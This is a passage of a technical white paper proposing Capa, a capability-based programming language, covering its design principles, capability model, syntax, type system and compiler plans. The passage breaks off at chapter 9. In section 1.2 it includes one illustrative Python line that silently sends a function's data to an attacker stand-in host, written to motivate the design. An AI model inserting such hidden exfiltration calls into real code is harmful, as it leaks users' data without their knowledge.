# Technical White Paper

# Capa

## A capability-centric programming language

Justification, Specification and Roadmap
Version 1.0, May 2026

*Technical design document*

## Table of Contents

- Executive Summary
- 1. Introduction and Motivation
- 2. State-of-the-Art Analysis
- 3. Design Philosophy and Principles
- 4. The Capability System
- 5. Syntax and Semantics
- 6. Type System
- 7. Compiler Architecture
- 8. Runtime Performance Strategy
- 9. Detailed Comparison with Existing Languages
- 10. Use Cases
- 11. Implementation Roadmap
- 12. Known Limitations and Future Work
- Glossary
- References

---

## Executive Summary

This document presents the technical justification, conceptual design and implementation roadmap of Capa, a new general-purpose programming language whose central principle is the explicit expression of authority in the type system, a model known as capability-based security.

The motivation for creating Capa is not to replace existing languages in domains where they are already adequate. It is, instead, to respond to a specific set of problems that mainstream 2026 languages continue to handle unsatisfactorily: the disproportionate growth of software supply chain attacks, the opacity of side effects in third-party code, the friction between strong static guarantees and developer ergonomics, and the difficulty of demonstrating regulatory compliance in code (notably under the EU Cyber Resilience Act).

Capa proposes a concrete technical compromise: syntax and semantics intentionally close to Python and TypeScript, a static type system with strong inference, and a capability model as a language primitive (not as a library). The initial implementation strategy is transpilation to Python 3.12+, with migration planned to a native LLVM-based backend in a later phase of the project.

**THE THREE CENTRAL COMMITMENTS**

1. **Security expressed in the type:** no function can produce side effects (network, disk, environment, processes) without having received the corresponding capability as an explicit argument.
2. **Accessible syntax:** learning curve comparable to that of Python; a Python programmer should be able to read Capa in less than an hour.
3. **Pragmatic performance:** acceptable speed from day one (via efficient transpilation to Python), with a clear path to performance competitive with Go through a native backend.

The document is organised into twelve chapters. The first three establish the context, the problem, and the state-of-the-art analysis. Chapters four through eight describe in detail the features, syntax, type system and compiler architecture. Chapters nine through twelve cover the comparison with existing languages, use cases, roadmap and known limitations.

---

## 1. Introduction and Motivation

### 1.1 The 2026 context

We are living through a paradoxical moment in software engineering. On the one hand, we have more expressive languages, more sophisticated static analysis tools, and richer library ecosystems than at any other point in history. On the other, security incidents originating in application code, not in operating systems or infrastructure, continue to grow year after year, and supply chain attacks have become one of the most difficult categories of threat to mitigate.

The recent literature on supply chain security consistently identifies three structural causes for this situation. The first is the opacity of third-party code: when an application imports hundreds of transitive packages, it is practically impossible to know, without dynamic analysis, what resources each of those packages accesses at runtime. The second is the absence of static guarantees over effects: mainstream languages treat access to the network, disk, environment and processes as operations ambiently available to any function, with no need for declaration or proof. The third is the disconnect between regulation and code: regulations such as the EU Cyber Resilience Act require manufacturers of products with digital elements to demonstrate control over their software inventory (SBOM) and over its behaviours, but the code is written in languages that were not designed to support that kind of evidence.

### 1.2 The problem of ambient authority

The technical concept that captures the first two structural causes identified above is called **ambient authority**. In a language with ambient authority, any function, at any point in the program, can invoke network operations, read or write files, launch processes, or read environment variables, without having received explicit authorisation to do so.

Consider the following Python example:

```python
# A seemingly innocent function
def compute_statistics(values: list[float]) -> dict:
    mean = sum(values) / len(values)
    return { 'mean': mean, 'n': len(values) }
```

The signature of this function suggests a purely computational operation. But nothing in the language prevents someone, in a future version or in a transitive dependency, from adding:

```python
import requests

def compute_statistics(values: list[float]) -> dict:
    mean = sum(values) / len(values)
    requests.post('https://attacker.example.com', json={'data': values})
    return { 'mean': mean, 'n': len(values) }
```

The type system does not detect the change. The linter does not detect the change. The IDE does not detect the change. Only a human code review, or dynamic analysis tools running in a sandbox, would be able to detect this kind of exfiltration, and even these frequently fail when the malicious behaviour is conditional or time-deferred.

> **OPERATIONAL DEFINITION**
>
> Ambient authority is the property of a programming system in which the ability to perform a privileged operation (access to resources external to the process) is implicitly available to any portion of executing code, with no need for an explicit reference to an authorisation.

### 1.3 Why a new language

The most obvious objection to this project is direct: why create a new language when there already exist languages with sophisticated type systems (Rust, Haskell), with effect systems (Koka, Effekt), and with research capability models (Pony, E)? The answer has three components.

First, none of the cited languages combines, in a single system, capabilities as a language primitive with a syntax accessible to the average programmer. Rust has demanding ergonomics and prioritises ownership, not capabilities. Haskell has effects, but its learning curve repels most programmers. Pony and E are academic research languages, without industrial traction or a viable ecosystem.

Second, the European regulatory context has changed substantially over the last two years. The EU Cyber Resilience Act, which entered into force in 2024 and whose main obligations begin to apply in 2027, requires manufacturers of products with digital elements to maintain an up-to-date SBOM and to be accountable for actively exploited vulnerabilities in any component of their product. A language whose types express directly what effects a component may produce offers a technical basis for satisfying these obligations in a way that languages with ambient authority simply cannot.

Third, and more pragmatically: the opportunity exists. Current mainstream languages, Python, JavaScript, Java, C#, Go, share common blind spots in security, and none of them can solve this problem retroactively without breaking compatibility. A new language, designed from the ground up with this model, avoids that constraint.

### 1.4 Objectives of this document

This document has three objectives. First, to technically justify the creation of Capa, demonstrating that there is a genuine design space that existing languages do not occupy. Second, to specify with precision the core features of the language, at the level needed to serve as a basis for implementation. Third, to present a realistic roadmap to take Capa from the current state (specification) to a usable prototype.

It is not the goal of this document to replace a complete formal specification. Capa, in its current form, is a proposal. Aspects such as formal semantics, the memory model, and the details of the module system will be developed further in later documents.

---

## 2. State-of-the-Art Analysis

Before justifying the creation of a new language it is mandatory to take an honest survey of what already exists. This section compares the main contemporary programming languages, grouped by family, along six dimensions relevant to the problem Capa aims to solve: the treatment of side effects, the expressiveness of the type system, the learning curve, runtime performance, ecosystem maturity, and support for security guarantees.

### 2.1 Dynamic languages with type hints (Python, TypeScript)

Python and TypeScript are, at the date of this document, the two most widely used languages in the development of new application software. Both have adopted, over the last decade, optional type annotation systems (PEP 484 in Python, native type system in TypeScript) that allow significant gains in robustness and tooling.

The strengths of this family are well known: excellent ergonomics, rapid iteration cycle, vast and mature ecosystems, active communities. The weaknesses, in the context of this document, are equally clear. Neither of the two languages treats side effects as first-class citizens of the type system. Both rely on conventions, on documentation, and on external tools (linters, sandboxes, supplementary static analysis) to mitigate the risks associated with ambient authority. Neither can be retroactively converted into a capability-based system without breaking compatibility with all existing code.

### 2.2 Compiled languages with static types (Go, Java, C#)

Go, Java and C# represent industrial pragmatism in statically typed languages. Go bets on radical simplicity and on concurrency via goroutines. Java and C# have considerably more sophisticated type systems (generics, annotations, reflection) and deep enterprise ecosystems.

These languages share a relevant property: they have stronger static guarantees than Python, but they retain the ambient authority model when it comes to side effects. In any of the three, a utility class can open a socket, read from disk, or invoke an operating system process without that capability being reflected in its public interface. Java historically had the Security Manager, but it was deprecated in recent versions precisely because the authorisation model based on stack walking proved difficult to reason about and to maintain.

### 2.3 Systems languages with advanced types (Rust)

Rust deserves a separate analysis because it occupies a unique position in the current landscape. Its ownership and borrowing system provides memory safety guarantees without a garbage collector, and its type system supports functional programming patterns that, in no other mainstream language, are accompanied by C++-level performance.

Rust is, without circumlocution, the language that comes closest to Capa's objectives in terms of static guarantees. However, Rust does not treat capabilities as a primitive. The Rust model prevents whole classes of bugs (data races, use-after-free), but it does not prevent a function with no special marking from calling `std::fs::read()` or `std::net::TcpStream::connect()`. The learning curve of Rust is also, by general admission, high, partly for essential reasons (ownership is genuinely hard), partly for accidental reasons (the syntax and certain design choices impose cognitive cost).

### 2.4 Functional languages with effect systems (Haskell, Koka, Effekt)

This family represents, conceptually, the closest approximation to what Capa proposes, but via a different path. Haskell distinguishes, in the type system, pure code from effectful code via monads (in particular IO). More recent languages such as Koka and Effekt formalise this through algebraic effects and effect handlers, allowing effects to be declared and handled compositionally.

The strengths are obvious: these languages offer very strong guarantees about what code can or cannot do. The weaknesses, for Capa's target audience, are equally so: the entry barrier is high, the industrial tooling is limited, and the paradigm is unfamiliar to most programmers trained in the last two decades. For a programmer trained in Python or JavaScript, reading idiomatic Haskell is frequently an opaque experience.

### 2.5 Experimental capability-centric languages (Pony, E, Newspeak)

There are direct precedents for Capa's approach. Pony uses a system of reference capabilities to guarantee data race freedom. E and Newspeak are object-oriented languages with object capabilities as a native security model. The WebAssembly Component Model is exploring capabilities for the WASM ecosystem.

These languages validate that the model is viable, but none of them has achieved significant adoption outside academic or research niches. The reasons vary, unfamiliar syntax, limited ecosystem, lack of a clear value proposition for the average programmer, but the pattern is consistent. Capa aims to learn from these attempts, preserving the capability model while adopting a radically different syntax and adoption strategy.

### 2.6 Comparative synthesis

The table below summarises, necessarily in a simplified form, the positioning of each language family along the dimensions relevant to the problem.

| Language | Types | Capabilities | Syntax | Performance | Ecosystem |
|---|---|---|---|---|---|
| Python | Optional | No | Accessible | Low | Excellent |
| TypeScript | Structural | No | Accessible | Medium | Excellent |
| Go | Nominal | No | Simple | High | Good |
| Java/C# | Nominal | Limited | Verbose | High | Excellent |
| Rust | Advanced | No | Hard | Very high | Growing |
| Haskell | Advanced | Via monads | Hard | High | Limited |
| Pony / E | Capabilities | Yes | Unfamiliar | Medium | Minimal |
| Capa (proposed) | Static + inferred | Yes, primitive | Pythonic | Medium → High | To be built |

> **ANALYSIS CONCLUSION**
>
> A genuine and unoccupied space exists: a language with capabilities as a primitive, syntax accessible to the average programmer, a static type system with inference, and a pragmatic ecosystem-bootstrapping strategy. None of the existing languages simultaneously occupies these four coordinates.

---

## 3. Design Philosophy and Principles

This section articulates the non-negotiable principles that guide Capa's design. Each principle is presented, justified and, when necessary, confronted with its main trade-off. These principles should be a permanent reference in all subsequent implementation decisions.

### 3.1 Principle 1: Explicit authority

Every operation that produces observable effects outside the process (network, disk, environment, processes, system clock, non-deterministic random generator) requires possession of a corresponding capability. Capabilities are not forgeable values: they can only be obtained from the runtime at the program boundary (the `main` function) or received as an argument from functions that already possess them.

This principle is the central thesis of the language. Everything that follows derives from it.

> **ASSUMED TRADE-OFF**
>
> Functions that need IO will have longer signatures than in Python or Go. This additional verbosity is the direct price of the guarantee, and the design team considers it acceptable, in particular because it makes the function's effect surface visible in the signature itself.

### 3.2 Principle 2: Pythonic syntax as a starting point

The syntax of Capa is designed to be readable by a Python programmer without prior training. Significant indentation, keywords in common English, absence of superfluous punctuation, and a small core of syntactic concepts. Where Capa diverges from Python, the divergence is only justified if it is necessary to support the type system or the capability system.

The justification for this choice is not aesthetic, it is strategic. The greatest barrier to adopting a new language is not technical, it is cognitive. Reducing that barrier is the only realistic way to bring capabilities to an audience that does not write Haskell.

### 3.3 Principle 3: Static types with inference

Capa is statically typed. Every expression has a type known at compile time. However, most types are inferred by the compiler; the programmer only needs to write annotations at boundaries (parameters of public functions, fields of exported types, and wherever inference is ambiguous).

This combination is deliberate: we want the static guarantees of Rust or Haskell, but with the visual lightness of Python. The model is largely inspired by TypeScript and Swift.

### 3.4 Principle 4: Pragmatic performance

Capa does not pursue C++ or Rust level performance. In its initial transpiled version, it pursues performance comparable to CPython with types. In its future native-backend version, it pursues performance comparable to Go. This prioritisation reflects the target audience: server applications, command-line tools, infrastructure automation, enterprise business logic, not kernels, drivers, or AAA games.

This choice allows design decisions that would be impractical for a systems language: garbage collection by default, runtime abstractions that simplify generated code, dynamic checks at capability boundaries.

### 3.5 Principle 5: Radical interoperability with Python

At least throughout Phase 1 of the project, Capa transpiles to Python and any Python library can be invoked from Capa code. This interoperability is assumed to be permanent, even after the introduction of a native backend: Python will remain a first-class execution platform.

The justification is the ecosystem problem. A new language with no ecosystem is a dead language. Reusing the Python ecosystem, pandas, numpy, requests, FastAPI, scikit-learn, and others, gives Capa, on day one, access to hundreds of thousands of packages. The cost of this choice is that Python code invoked from Capa cannot offer the same capability guarantees, a trust boundary that is made explicit in the language (see Chapter 4).

### 3.6 Principle 6: Compiler errors as a pedagogical tool

The error messages of the Capa compiler are designed to teach. When the compiler rejects code for a capability violation, the message should identify the specific operation, the missing capability, and suggest the correct way to obtain it. This principle is influenced directly by the error message culture of Rust and Elm.

### 3.7 Non-objectives

It is equally important to state what Capa does not try to be:

- **Not a systems language.** It does not replace Rust, C, or Zig. It has no ambition to write kernels or drivers.
- **Not a high-performance scientific language.** It does not replace Julia or Fortran for intensive numerical computation (though it can orchestrate libraries that do).
- **Not a pure functional language.** It does not replace Haskell or OCaml. Capa is a multi-paradigm language with an imperative leaning, with functional affinity where this simplifies expression.
- **Not a type-system research vehicle.** It does not introduce dependent types, refinement types, or linear types as core features. These extensions can be added later, but they are not part of the language core.

---

## 4. The Capability System

This chapter describes, with the level of detail needed for implementation, the capability system of Capa. It starts with the theoretical motivation, goes through the standard capabilities of the language, and finishes with the formal rules of derivation and attenuation.

### 4.1 Theoretical foundation

The capability-based security model has its origin in the work of Dennis and Van Horn in 1966, was formalised in operating systems such as KeyKOS and EROS, and was popularised in programming languages by Mark Miller in the context of the language E. The central idea is simple: the authorisation to carry out an operation is not a property of the agent performing it (a user, a process, a function), but a transferable capacity, an unforgeable reference that confers the right to invoke the operation.

This inversion has profound consequences. In a capability-based system, the principle of least privilege ceases to be a good practice that is hard to implement and becomes the default behaviour: a function can only do what it has been given authority for. A malicious email attachment, executed in a process that never received network capabilities, is incapable of exfiltrating data, not because a sandbox prevents it, but because the operation simply is not available in its lexical context.

### 4.2 The standard capabilities of Capa

Capa defines an initial set of standard capabilities corresponding to broad categories of side effect. This list is deliberately small in the language core; additional capabilities can be defined in libraries for specific domains.

| Capability | Operations it authorises |
|---|---|
| `Net` | Open TCP/UDP connections, perform HTTP(S) requests, resolve DNS |
| `Fs` | Read, write, list and delete files in the filesystem |
| `Env` | Read and write process environment variables |
| `Proc` | Launch subprocesses, send signals, inspect the process tree |
| `Clock` | Read the system clock, create timers, sleep |
| `Random` | Obtain cryptographically secure random values from the system |
| `Stdio` | Read and write on stdin, stdout and stderr |
| `Db` | Access databases (composite capability, usually derived from `Net`) |

Each capability is, at the type level, an opaque value of the corresponding type (the `Net` type, the `Fs` type, etc.). These types have no public constructors: the only way to obtain an instance is through the runtime, in the `main` function, or to receive it as an argument from a function that already has it.

### 4.3 Attenuation (capability attenuation)

Granting a complete capability is, in many cases, granting too much. If a function only needs to make HTTP requests to a single domain, giving it a full `Net` capability allows it to talk to any server on the internet. Capa supports attenuation as a first-class mechanism: a capability can be restricted at runtime to a subset of its original authority.

```capa
fun main(net: Net) {
    // Attenuate the network capability to a single domain
    let api = net.restrict_to("api.example.com")

    // This function can only talk to api.example.com
    fetch_data(api)
}

fun fetch_data(net: Net) {
    // Attempts to access another domain fail at runtime
    // (and can be statically rejected with future refinement types)
    net.get("https://api.example.com/users")  // OK
}
```

Attenuation is unidirectional: once restricted, a capability cannot be widened. Restrictions compose (restricting an already restricted capability produces an intersection of the restrictions). The runtime keeps metadata about applied restrictions, and any operation that tries to exceed what is authorised fails immediately, without reaching the corresponding syscall.

### 4.4 Derivation rules

The formal rules that govern the use of capabilities in Capa can be summarised in four points:

- **R1 (Single origin):** instances of standard capabilities can only be obtained as parameters of the `main` function, as parameters of functions (which themselves received them), or by applying attenuation operations to existing capabilities.
- **R2 (Non-forgeability):** the type system guarantees that there are no public constructors for capability types. Attempts at direct instantiation are compile errors.
- **R3 (Explicit propagation):** a function that needs a capability must declare it in its signature. The compiler rejects calls that do not pass the required capability.
- **R4 (Monotonic attenuation):** the restrictions applied to a capability can only reduce its authority, never widen it.

### 4.5 The boundary with Python

As mentioned in the principles, Capa interoperates radically with Python. But Python has ambient authority: any Python library can access any resource. How is this reconciled with Capa's guarantees?

Capa's answer is to make the boundary explicit. Every call to Python code from Capa happens through a special operation, `py.invoke`, which requires a dedicated capability called `Unsafe`. This capability is itself a normal capability, subject to the previous rules: it must be obtained in `main` and propagated explicitly. Functions that invoke Python code must declare `Unsafe` in their signature, making the presence of a trust boundary visible.

```capa
// The function explicitly declares that it crosses the boundary into Python
fun parse_csv(unsafe: Unsafe, path: String) -> Table {
    let pandas = py.import(unsafe, "pandas")
    let df = py.invoke(unsafe, pandas.read_csv, [path])
    return Table.from_python(df)
}
```

> **DESIGN JUSTIFICATION**
>
> The Capa/Python boundary cannot be closed without destroying interoperability. Instead of pretending to a guarantee we do not have, we explicitly mark where the guarantee is lost. The programmer, and the auditor, know exactly where to look.

### 4.6 User-defined capabilities

The standard capabilities cover side effects at the operating-system level, but the concept generalises. Libraries and applications can define their own capabilities to represent authority over domain-specific resources: access to a database, the ability to send emails, authority to modify the state of an actor, and so on.

```capa
// Definition of an application-level capability
capability SendEmail {
    fun send(self, to: String, subject: String, body: String)
}

// Concrete implementation (only obtainable through a factory
// that receives the low-level capabilities it needs)
type SmtpService implements SendEmail {
    server: String,
    net: Net,        // private capability, obtained at construction
}

fun create_smtp_service(net: Net, server: String) -> SmtpService {
    return SmtpService { server: server, net: net.restrict_to(server) }
}
```

This pattern allows the construction of abstraction layers in which each level sees only the capabilities it needs, hiding its internal composition. A function that receives `SendEmail` has no visibility into the underlying `Net`.

---

## 5. Syntax and Semantics

This chapter describes the concrete syntax of Capa, with progressively richer examples, and introduces the operational semantics informally. The formal semantics will be the subject of a separate document.

### 5.1 Syntactic philosophy

Capa's syntax pursues three properties simultaneously: readability for Python programmers, sufficient expressiveness to accommodate the type system, and absence of lexical ambiguities that complicate parser implementation. When these objectives collide, the priority is readability, provided expressiveness is not sacrificed.

#### 5.1.1 Significant characters

Capa uses significant indentation, like Python. Blocks are delimited by indentation level, not by braces. Canonical indentation is four spaces; tab characters are forbidden (lexical error).

Unlike Python, Capa does not use a colon as a separator between the block header and its body. This omission is a deliberate divergence: it simplifies the parser and reduces the amount of punctuation the programmer needs to type.

### 5.2 Minimal program

```capa
// hello.capa, the smallest possible Capa program
fun main()
    print("Hello, world!")
```

Notes on this example: `print` is a function from the prelude that writes to stdout. In a strict version, `print` would require a `Stdio` capability, but the standard prelude provides a version derived from the root capability of `main`. This compromise makes the first programs easier; in strict mode (`--strict-stdio`), the compiler requires the explicit capability even for `print`.

### 5.3 Primitive types and literals

| Type | Example literals | Notes |
|---|---|---|
| `Int` | `0`, `42`, `-7`, `1_000_000` | 64-bit signed integer |
| `Float` | `3.14`, `-0.5`, `1e10` | 64-bit IEEE 754 floating point |
| `Bool` | `true`, `false` | Boolean |
| `String` | `"hello"`, `"line 1\nline 2"` | UTF-8 encoded, immutable |
| `Char` | `'a'`, `'\n'`, `'\u{1F600}'` | Unicode codepoint |
| `Unit` | `()` | Type with a single value; similar to `void` |
| `Never` | (no literal) | Type of functions that never return |

### 5.4 Variables and assignment

```capa
fun example()
    let name = "Capa"           // immutable, type inferred as String
    let age: Int = 0             // immutable, explicit type
    var counter = 0              // mutable (var instead of let)
    counter = counter + 1        // ok
    name = "other"               // ERROR: name is immutable
```

The `let`/`var` distinction is central: immutability is the default case, mutability requires the `var` keyword. This bias favours code that is easier to reason about, in particular in the presence of concurrency.

### 5.5 Functions

```capa
// Simple function without capabilities
fun add(a: Int, b: Int) -> Int
    return a + b

// Function with inferred return (annotation recommended in public APIs)
fun double(x: Int)
    return x * 2

// Function with a declared capability
fun greet(stdio: Stdio, name: String)
    stdio.print("Hello, " + name)

// Function with multiple capabilities and a return value
fun save_log(fs: Fs, clock: Clock, message: String) -> Result<Unit, IoError>
    let timestamp = clock.now()
    return fs.append("app.log", timestamp.iso() + " " + message)
```

### 5.6 Control structures

```capa
fun classify(x: Int) -> String
    if x < 0
        return "negative"
    elif x == 0
        return "zero"
    else
        return "positive"

fun sum_list(xs: List<Int>) -> Int
    var total = 0
    for x in xs
        total = total + x
    return total

fun first_power_above(limit: Int) -> Int
    var p = 1
    while p < limit
        p = p * 2
    return p
```

### 5.7 Algebraic types and pattern matching

Capa supports sum types and pattern matching, in the style of Rust and Swift but with lighter syntax.

```capa
type Shape =
    Circle(radius: Float)
    Rectangle(width: Float, height: Float)
    Triangle(base: Float, height: Float)

fun area(s: Shape) -> Float
    match s
        Circle(r) -> 3.14159 * r * r
        Rectangle(w, h) -> w * h
        Triangle(b, h) -> 0.5 * b * h
```

The compiler checks exhaustiveness: if a `match` does not cover all the cases of the type, it is a compile error. This is, in practice, one of the most useful mechanisms for avoiding bugs in refactorings, adding a new variant to a sum type forces the compiler to point out every location where the new case needs to be handled.

### 5.8 Result and Option

Capa does not have exceptions in the traditional sense. Error handling is done with `Result<T, E>` and `Option<T>` types, in the style of Rust and Swift. The `?` operator propagates errors to the calling function.

```capa
fun read_int(fs: Fs, path: String) -> Result<Int, AppError>
    let content = fs.read(path)?         // propagates IoError
    let value = Int.parse(content)?       // propagates ParseError
    return Ok(value)

fun first_line(s: String) -> Option<String>
    let lines = s.split("\n")
    if lines.size() == 0
        return None
    return Some(lines[0])
```

### 5.9 Composite types: structures and enumerations

```capa
// Structure with named fields
type User {
    id: Int,
    name: String,
    email: String,
    active: Bool
}

// Construction and access
fun example()
    let u = User {
        id: 1,
        name: "Ana",
        email: "ana@example.com",
        active: true
    }
    print(u.name)

// Simple enumeration (special form of sum type without data)
type Status =
    Pending
    InProgress
    Completed
    Failed
```

### 5.10 Generics

Capa supports parametric polymorphism (generics) with syntax close to Rust's and TypeScript's. Inference allows, in most cases, type parameters not to be written explicitly at use sites.

```capa
// Generic function
fun first<T>(xs: List<T>) -> Option<T>
    if xs.size() == 0
        return None
    return Some(xs[0])

// Generic type
type Pair<A, B> {
    first: A,
    second: B
}

// Constraint: T must implement the Comparable trait
fun max<T: Comparable>(a: T, b: T) -> T
    if a > b
        return a
    return b
```

### 5.11 Traits

Traits in Capa are analogous to Java interfaces, Haskell type classes, or Rust traits. They define a set of operations that a concrete type can implement.

```capa
trait Serializable
    fun to_json(self) -> String
    fun to_yaml(self) -> String

// Implementation for a specific type
impl Serializable for User
    fun to_json(self) -> String
        return json.serialize(self)
    fun to_yaml(self) -> String
        return yaml.serialize(self)
```

---

## 6. Type System

The type system is the mechanism that makes the capability system executable. This section describes Capa's typing principles in more depth than the previous sections.

### 6.1 Main characteristics

- **Static with inference:** all types are known at compile time, but most do not need to be written explicitly. Inference uses a variant of the Hindley-Milner algorithm adapted to support nominal subtyping.
- **Nominal by default, with structural extensions:** user-defined types are distinguished by name, not by structure. However, anonymous record types and structural traits allow structural programming patterns when useful.
- **Immutability by default:** every value is immutable unless declared with `var`. This choice simplifies inference and reasoning about concurrency.
- **No null:** there is no generic `null` value. The absence of a value is represented by the `Option<T>` type, and the compiler rejects the use of an `Option` as if it were a `T`.
- **Capabilities as types:** standard capabilities are opaque types of the system, and special rules govern their construction and propagation.

### 6.2 Type inference

Capa's inference follows two practical rules. First: inside the body of a function, all local variables have their types inferred from their initialisations and from the operations in which they participate. Second: at the boundaries of the function (parameters and return type), and at the boundaries of exported types (public fields, public methods), types must be annotated explicitly.

This separation is deliberate: it minimises visual noise in common application code, but forces clarity at the points where different modules interact. Public APIs in Capa are always self-documenting at the type level.

### 6.3 Subtyping

Capa has limited nominal subtyping: a concrete type is a subtype of the traits it implements. There is no class-based subtyping (there are no classes as such, Capa is type- and trait-oriented, not based on class hierarchies).

This choice avoids known problems of deep hierarchies (covariant/contravariant misuse, fragile base class), while preserving polymorphism via traits.

### 6.4 The type of capabilities

The types of the standard capabilities (`Net`, `Fs`, `Env`, `Proc`, `Clock`, `Random`, `Stdio`) are opaque types of the system. This means three things: the programmer cannot define aliases for these types with their own constructors; there are no public variants that allow literal instantiation; and the compiler treats them specially in the propagation rules.

Technically, these types are marked internally as capability types, and the type system applies additional restrictions to them. For example, capabilities cannot be stored in global structures; they can only live on the stack or in fields of types whose instances are themselves reachable only from `main`.

### 6.5 Inferred purity

A function is considered pure if it receives no capability as a parameter and if all the functions it invokes are pure. Purity is not an annotation the programmer writes: it is a property automatically derived by the compiler from the signature.

The practical consequence is important: the programmer can reason about their code by looking only at the signatures. A function whose signature does not mention capabilities is, by guarantee, isolated from side effects, with no need to inspect the body nor to audit its dependencies.

> **IMPLICATION FOR CODE AUDIT**
>
> In Capa, auditing the effect surface of a module reduces to inspecting the signatures of its public functions. If none mentions capabilities, the module is pure and can be used in any context. This property is impossible to guarantee in Python, JavaScript, Java, C# or Go.

### 6.6 Refinement types (future)

A planned extension, but not included in the initial version of the language, are refinement types: the ability to annotate types with compile-time predicates (for example, `Int{x > 0}` for positive integers, or `String{size < 256}` for bounded strings). This extension would integrate naturally with the capability system, allowing finer constraints to be expressed (for example, a `Net` capability restricted to a set of domains verifiable statically).

---

## 7. Compiler Architecture

This chapter describes the internal architecture of the Capa compiler in its Phase 1 version (transpilation to Python). The architecture is designed to be modular, allowing individual passes to be replaced as the language evolves, in particular, the replacement of the Python generator by a bytecode or LLVM IR generator in the near future.

### 7.1 Pipeline overview

The compilation pipeline has seven stages, each with a clear boundary and a well-defined intermediate representation:

1. **Lexical (tokenizer):** transforms source text into a sequence of tokens, handling significant indentation via a Python-style INDENT/DEDENT mechanism.
2. **Syntactic (parser):** transforms tokens into an abstract syntax tree (AST). The planned implementation is a hand-written recursive descent parser, or one based on Lark.
3. **Name resolution:** associates each identifier with its declaration, detecting use of undeclared names and problematic shadowing.
4. **Type checking:** infers and checks types of all expressions. This is where the rules of the capability system live.
5. **Capability analysis:** a dedicated pass for checking rules R1-R4 (Chapter 4). Isolating this pass facilitates evolution and debugging.
6. **Lowering:** transforms the typed AST into an intermediate representation (Capa IR) that is simpler and easier to map onto Python.
7. **Code generation:** produces Python 3.12+ from the IR. Includes injection of runtime helpers for dynamic enforcement of attenuated capabilities.

### 7.2 Implementation technology

The initial version of the compiler is implemented in Python 3.12, for three pragmatic reasons: the language author is fluent in Python, Python has a rich ecosystem for building compilers (Lark, ANTLR, dataclasses, type hints), and transpilation to Python integrates trivially with a compiler written in Python.

This choice is provisional. In Phase 4 of the roadmap, the rewriting of the compiler in Capa itself (self-hosting) is planned, once the language is sufficiently mature to sustain itself.

### 7.3 Capa IR, intermediate representation

Between the typed AST and the Python generator there is an intermediate representation (Capa IR) that serves two purposes. First, it simplifies the code generator: the IR is more regular than the AST and contains no redundant syntactic forms. Second, it prepares the ground for alternative code generations, generating Python bytecode, LLVM IR, or WebAssembly from the same IR is an isolated exercise, with no need to touch the earlier pipeline stages.

The Capa IR is designed to support additional static analyses (escape analysis, devirtualisation, inlining of small functions). These analyses are not a priority for Phase 1, but the IR does not preclude them.

### 7.4 Transpiled execution model

The Python code generated by Capa follows a set of conventions that preserve, at runtime, the guarantees of the source language:

- **Capabilities as opaque objects:** each standard capability corresponds to a Python class with no public constructor. Instances are created by the runtime at program start and propagated as arguments.
- **Dynamic attenuation checks:** operations on attenuated capabilities check, at runtime, the restrictions applied. This check has a cost, but it is local and cheap.
- **No reflection:** the generated Python code does not use features that compromise the guarantees (stack introspection, monkey-patching). The runtime activates Python flags that minimise these surfaces.
- **Controlled type erasure:** generic types are erased during code generation, but type checks are preserved at critical boundaries. The behaviour is equivalent to TypeScript's.

### 7.5 Toolchain

The initial Capa distribution includes:

- `capac`, the command-line compiler (`capac` compiles `.capa` files to Python and/or to a startup executable).
- `capa`, the runner that executes Capa programs (compiling if needed and injecting the runtime).
- `capa-fmt`, the canonical code formatter, single and non-configurable (in the spirit of `gofmt`).
- `capa-doc`, the documentation generator from structured comments.
- `capa-lsp`, the language server for IDE integration (VS Code, Neovim, Helix, etc.).

---

## 8. Runtime Performance Strategy

Runtime performance is an explicit requirement for Capa. This section describes the performance strategy in two phases: the transpilation-to-Python phase (short and medium term) and the native compilation phase (medium and long term).

### 8.1 Performance objectives

Capa does not aim to compete with C, C++, Rust or Zig in raw performance. The objective is different, and is aligned with the target audience: server applications, command-line tools, DevOps automation, enterprise business logic. For this audience, the relevant criteria are startup time, latency per request, throughput under concurrent load, and memory consumption, not raw arithmetic operation throughput.

| Metric | Phase 1 (transpilation) | Phase 4 (native) |
|---|---|---|
| Startup time | Equal to Python (cold start) | Comparable to Go |
| HTTP request latency | Equal to Python+FastAPI | Comparable to Go (1.2-2x) |
| CPU-bound throughput | 0.8-1.0x of typed Python | 5-10x of Python |
| IO-bound throughput | Equal to Python asyncio | Comparable to Go |
| Memory consumption | +10% over equivalent Python | Comparable to Go |

### 8.2 Strategy for Phase 1: efficient translation

The transpilation-to-Python phase has a well-defined performance ceiling, Python's. The objective is to approach that ceiling, not to overtake it. To this end, the strategy has five strands:

- **Idiomatic code generation:** the generated Python should use, whenever possible, the fastest known constructs (comprehensions instead of loops, builtins instead of pure-Python equivalents, dataclasses instead of dicts for composite types).
- **Type-based specialisation:** since Capa knows the type of every expression, the transpiler can choose specialised implementations. For example, summation over `List<Int>` uses the `sum()` builtin; summation over user-defined types uses a specialised loop.
- **Elimination of redundant checks:** operations whose safety is statically proved in Capa do not generate runtime checks in the emitted Python.
- **Explicit support for PyPy:** the generated Python is designed to be friendly to PyPy's JIT, avoiding patterns pathological for the tracing JIT.
- **Optional compilation to C extensions:** sections marked as hot paths can be compiled via mypyc or Cython, automatically, if the tools are available in the user's environment.

### 8.3 Strategy for Phase 4: native backend

In the medium and long term, Capa will have a native backend. The options considered are three: generate LLVM IR (maximum performance path, high complexity), generate C or C++ code (intermediate path, toolchain simplicity), or implement a custom virtual machine (maximum control, enormous implementation effort).

The preliminary decision is to generate LLVM IR via a library such as `llvmlite`. This choice gives us industrial optimisations (from LLVM) without having to implement any of them ourselves, support for multiple architectures (x86_64, ARM64, RISC-V), and natural integration with the existing tooling ecosystem.

### 8.4 Garbage collection

Capa uses garbage collection. In Phase 1, the GC is that of CPython (cyclic reference + tracing). In Phase 4, a concurrent generational GC is planned, similar to Go's. This choice sacrifices latency determinism (which Rust or Zig offer) in exchange for programming simplicity, consistent with the language's principles.

For scenarios where deterministic latency matters (embedded systems, soft real-time), Capa is not an appropriate choice. The document is clear on this point from Chapter 3 (non-objectives).

### 8.5 Concurrency

The concurrency primitive in Capa is the asynchronous task, in the async/await model. The runtime manages an event loop per thread (single-threaded by default, with optional parallelism via worker pools).

Capabilities propagate naturally to asynchronous tasks, a task can only access the resources that were passed to it as an argument, exactly like a synchronous function. This property makes the capability system especially useful in concurrency scenarios: each task has its own view of authority, and it is impossible, by construction, for a task to access resources that were never handed to it.

---

## 9. Detailed Comparison with Existing Languages

